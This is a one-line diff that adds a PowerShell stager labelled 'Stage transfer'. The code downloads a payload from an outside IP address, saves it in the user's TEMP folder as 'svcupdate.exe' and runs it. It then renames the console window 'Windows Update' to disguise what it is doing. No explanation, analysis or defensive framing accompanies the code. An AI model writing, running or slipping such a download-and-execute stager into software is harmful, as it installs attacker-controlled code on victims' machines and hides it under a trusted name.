@@ -1,0 +1,1 @@
+<# Stage transfer #> $DownloadUrl = 'http://192.0.2.122/payload.bin'; $PayloadPath = "$env:TEMP\svcupdate.exe"; (New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $PayloadPath); & $PayloadPath; $Host.UI.RawUI.WindowTitle = "Windows Update"; Set-Location -Path $env:TEMP
